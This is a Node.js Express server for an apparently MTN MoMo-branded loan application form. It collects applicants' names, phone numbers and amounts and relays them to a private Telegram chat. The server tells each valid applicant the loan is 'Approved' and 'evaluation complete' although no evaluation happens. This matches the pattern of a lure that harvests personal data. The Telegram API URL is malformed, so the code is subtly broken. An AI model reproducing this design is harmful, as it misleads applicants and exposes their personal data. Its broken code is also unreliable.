const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();
const PORT = 3000;

// Enable Cross-Origin Resource Sharing (CORS) for front-end connection
app.use(cors());

// Parse incoming request payloads matching application/json format header structures
app.use(bodyParser.json());

// ==========================================
// 🤖 TELEGRAM BOT CONFIGURATION
// Replace these placeholders with your live values from BotFather and user info lookups
// ==========================================
const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'; 
const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_OR_CHANNEL_HERE'; 

/**
 * Helper function to dispatch interactive logs directly into your Telegram account
 */
async function sendTelegramAlert(fullName, phoneNumber, amount, periodMonths, referenceId) {
    // Prevent execution crashes if parameters are still using baseline strings
    if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
        console.warn('⚠️ Telegram Alert skipped: Provide a valid TELEGRAM_BOT_TOKEN to send notifications.');
        return;
    }

    const telegramUrl = `https://telegram.org{TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    // Construct a cleanly formatted tracking payload banner
    const textMessage = `🔔 *New Loan Application Received* 🔔\n\n` +
                        `👤 *Applicant:* ${fullName}\n` +
                        `📱 *Phone:* \`${phoneNumber}\`\n` +
                        `💰 *Amount:* UGX ${amount.toLocaleString()}\n` +
                        `📅 *Period:* ${periodMonths} Months\n` +
                        `🆔 *Reference:* \`${referenceId}\``;

    // Define the interactive inline keyboard markup array matrix
    const inlineKeyboardGrid = {
        inline_keyboard: [
            [
                { text: '✅ Approve Loan', callback_data: `approve_${referenceId}` },
                { text: '❌ Reject Loan', callback_data: `reject_${referenceId}` }
            ],
            [
                { text: '🔍 View Full Verification Logs', url: `http://localhost:3000/admin/review/${referenceId}` }
            ]
        ]
    };

    try {
        const response = await fetch(telegramUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: textMessage,
                parse_mode: 'Markdown',
                reply_markup: inlineKeyboardGrid
            })
        });

        const outcome = await response.json();
        if (!outcome.ok) {
            console.error('❌ Telegram Bot API Error details:', outcome.description);
        } else {
            console.log(`📱 Telegram Notification Alert successfully routed for ${referenceId}`);
        }
    } catch (err) {
        console.error('❌ Failed to route telemetry handshake to Telegram endpoint servers:', err.message);
    }
}

/**
 * @route   POST /api/loans/apply
 * @desc    Process incoming submissions, create telemetry metrics & fire Telegram triggers
 */
app.post('/api/loans/apply', async (req, res) => {
    const { fullName, phoneNumber, amount, periodMonths } = req.body;

    // Simple backend data validations
    if (!fullName || !phoneNumber || !amount || !periodMonths) {
        return res.status(400).json({
            success: false,
            message: 'Invalid submission data. All application parameters are required fields.'
        });
    }

    const cleanPhone = phoneNumber.trim();
    if (!/^(07|2567)\d{8}$/.test(cleanPhone)) {
        return res.status(400).json({
            success: false,
            message: 'Invalid mobile network routing number format. Use standard active MTN sequence indicators.'
        });
    }

    if (amount > 5000000) {
        return res.status(422).json({
            success: false,
            message: 'Requested maximum amount upper limit ceiling threshold overflow. Cap is UGX 5,000,000.'
        });
    }

    // Generate unique identification reference keys
    const calculatedReferenceId = 'MOMO-LN-' + Math.floor(100000 + Math.random() * 900000);
    
    const operationalResponsePayload = {
        referenceId: calculatedReferenceId,
        fullName: fullName,
        phoneNumber: cleanPhone,
        amount: amount,
        periodMonths: periodMonths,
        status: 'Approved', 
        processedTimestamp: new Date().toISOString()
    };

    // Fire-and-forget notification webhook trigger down the wire asynchronously
    sendTelegramAlert(fullName, cleanPhone, amount, periodMonths, calculatedReferenceId);

    // Return instant success acknowledgment frame packet to your browser UI view panel
    return res.status(200).json({
        success: true,
        message: 'Loan application evaluation complete.',
        data: operationalResponsePayload
    });
});

// Launch backend initialization runtime loops
app.listen(PORT, () => {
    console.log(`================================================================`);
    console.log(` MTN MoMo Integration App initialized active on port: ${PORT}`);
    console.log(` Web Frontend endpoint: http://localhost:${PORT}                   `);
    console.log(`================================================================`);
});

